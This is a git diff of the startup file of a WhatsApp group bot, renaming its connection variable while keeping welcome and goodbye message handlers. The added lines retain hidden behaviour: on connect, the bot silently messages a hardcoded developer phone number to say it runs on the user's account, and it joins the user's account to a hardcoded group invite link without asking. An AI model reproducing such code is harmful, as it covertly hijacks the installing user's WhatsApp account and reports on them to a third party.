@@ -22,9 +22,9 @@ session = setting.session
 require('./DogeBot.js')
 nocache('./DogeBot.js', module => console.log(`${module} telah di update!`))
 
-const starts = async (DadiBrutalOP = new WAConnection()) => {
-    DadiBrutalOP.logger.level = 'warn'
-    DadiBrutalOP.version = [2, 2142, 12]
+const starts = async (DogeXeonOP = new WAConnection()) => {
+    DogeXeonOP.logger.level = 'warn'
+    DogeXeonOP.version = [2, 2142, 12]
     console.log(color(figlet.textSync('DADI KUHURI', {
 		font: 'Standard',
 		horizontalLayout: 'default',
@@ -42,78 +42,78 @@ console.log(color('  BRUTAL Bot Inc. 2022','mediumseagreen'))
     console.log(color('[DADI KUHURI]'), color('DADI KUHURI Is Online', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
     console.log(color('<>','red'), color('Thanks For Using DADI KUHURI', 'white'))
-	DadiBrutalOP.browserDescription = [ 'Subscribe BRUTAL', 'chrome', '3.0' ]
-    DadiBrutalOP.on('qr', () => {
+	DogeXeonOP.browserDescription = [ 'Subscribe BRUTAL', 'chrome', '3.0' ]
+    DogeXeonOP.on('qr', () => {
         console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
     })
 
-    fs.existsSync(`./${session}.json`) && DadiBrutalOP.loadAuthInfo(`./${session}.json`)
-    DadiBrutalOP.on('connecting', () => {
+    fs.existsSync(`./${session}.json`) && DogeXeonOP.loadAuthInfo(`./${session}.json`)
+    DogeXeonOP.on('connecting', () => {
         start('2', 'Loading ...')
     })
-    DadiBrutalOP.on('open', () => {
+    DogeXeonOP.on('open', () => {
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DadiBrutalOP.sendMessage(`919101765679@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`919101765679@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
     teks = `https://chat.whatsapp.com/BaPjXSgyslR6ynmXhWeqDl`
-    DadiBrutalOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+    DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
     
-    await DadiBrutalOP.connect({timeoutMs: 30*1000})
-        fs.writeFileSync(`./${session}.json`, JSON.stringify(DadiBrutalOP.base64EncodedAuthInfo(), null, '\t'))
+    await DogeXeonOP.connect({timeoutMs: 30*1000})
+        fs.writeFileSync(`./${session}.json`, JSON.stringify(DogeXeonOP.base64EncodedAuthInfo(), null, '\t'))
 
-    DadiBrutalOP.on('chat-update', async (message) => {
-        require('./DogeBot.js')(DadiBrutalOP, message, _welkom)
+    DogeXeonOP.on('chat-update', async (message) => {
+        require('./DogeBot.js')(DogeXeonOP, message, _welkom)
     })
-DadiBrutalOP.on("group-participants-update", async (anu) => {
+DogeXeonOP.on("group-participants-update", async (anu) => {
 
     const isWelkom = _welkom.includes(anu.jid)
     try {
-      groupMet = await DadiBrutalOP.groupMetadata(anu.jid)
+      groupMet = await DogeXeonOP.groupMetadata(anu.jid)
       groupMembers = groupMet.participants
       groupAdmins = getGroupAdmins(groupMembers)
       mem = anu.participants[0]
 
       console.log(anu)
       try {
-        pp_user = await DadiBrutalOP.getProfilePicture(mem)
+        pp_user = await DogeXeonOP.getProfilePicture(mem)
       } catch (e) {
         pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
       }
       try {
-        pp_group = await DadiBrutalOP.getProfilePicture(anu.jid)
+        pp_group = await DogeXeonOP.getProfilePicture(anu.jid)
       } catch (e) {
         pp_group =
           "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
       }
-            if (anu.action == "add" && mem.includes(DadiBrutalOP.user.jid)) {
-        DadiBrutalOP.sendMessage(anu.jid, "Hello everyone, am DADI KUHURI, ready to help you here ㋛︎", "conversation")
+            if (anu.action == "add" && mem.includes(DogeXeonOP.user.jid)) {
+        DogeXeonOP.sendMessage(anu.jid, "Hello everyone, am DADI KUHURI, ready to help you here ㋛︎", "conversation")
       }
       buffer = await getBuffer(pp_user)
-      if (anu.action == 'add' && !mem.includes(DadiBrutalOP.user.jid)) {
-      const mdata = await DadiBrutalOP.groupMetadata(anu.jid)
+      if (anu.action == 'add' && !mem.includes(DogeXeonOP.user.jid)) {
+      const mdata = await DogeXeonOP.groupMetadata(anu.jid)
       const memeg = mdata.participants.length
-      const thu = await DadiBrutalOP.getStatus(anu.participants[0], MessageType.text)
+      const thu = await DogeXeonOP.getStatus(anu.participants[0], MessageType.text)
       const num = anu.participants[0]
-      const bosco1 = await DadiBrutalOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
+      const bosco1 = await DogeXeonOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
       const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
-      let v = DadiBrutalOP.contacts[num] || { notify: num.replace(/@.+/, '') }
+      let v = DogeXeonOP.contacts[num] || { notify: num.replace(/@.+/, '') }
       anu_user = v.vname || v.notify || num.split('@')[0]
       time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
       time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
       teks = `   ⃟🐶⃟    𝙃𝙞 _*@${num.split('@')[0]}*_ \n   ⃟🐶⃟    𝘽𝙞𝙤 : _*${thu.status}*_ \n   ⃟🐶⃟    𝙈𝙚𝙢𝙗𝙚𝙧 : _*${memeg}*_ \n   ⃟🐶⃟    𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 _*${mdata.subject}*_\n   ⃟🐶⃟    𝘿𝙤𝙣𝙩 𝙁𝙤𝙧𝙜𝙚𝙩 𝙏𝙤 𝙍𝙚𝙖𝙙 𝘿𝙚𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣`
       welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'READ DESC 📋'},type:1}]
       welcomeButt = { contentText: `${teks}`, footerText: `DADI KUHURI`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
-      DadiBrutalOP.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
+      DogeXeonOP.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
       }
-      if (anu.action == 'remove' && !mem.includes(DadiBrutalOP.user.jid)) {
-      const mdata = await DadiBrutalOP.groupMetadata(anu.jid)
+      if (anu.action == 'remove' && !mem.includes(DogeXeonOP.user.jid)) {
+      const mdata = await DogeXeonOP.groupMetadata(anu.jid)
       const num = anu.participants[0]
-      const bosco3 = await DadiBrutalOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
+      const bosco3 = await DogeXeonOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
       const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
-      let w = DadiBrutalOP.contacts[num] || { notify: num.replace(/@.+/, '') }
+      let w = DogeXeonOP.contacts[num] || { notify: num.replace(/@.+/, '') }
       anu_user = w.vname || w.notify || num.split('@')[0]
       time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
       time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
@@ -121,7 +121,7 @@ DadiBrutalOP.on("group-participants-update", async (anu) => {
       out = `   ⃟🐶⃟    𝙂𝙤𝙤𝙙𝙗𝙮𝙚 _*@${num.split('@')[0]}*_\n   ⃟🐶⃟    𝙃𝙤𝙥𝙚𝙛𝙪𝙡𝙡𝙮 𝙏𝙝𝙚𝙧𝙚 𝙒𝙤𝙣'𝙩 𝘽𝙚 𝘽𝙪𝙧𝙙𝙚𝙣 𝙃𝙚𝙧𝙚 𝘼𝙣𝙮𝙢𝙤𝙧𝙚`
       goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'BYE 👋'},type:1}, {buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'}, type:1}]
       goodbyeButt = { contentText: `${out}`, footerText: `DADI KUHURI`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
-      DadiBrutalOP.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
+      DogeXeonOP.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
       }
     } catch (e) {
       console.log("Error : %s", color(e, "red"))
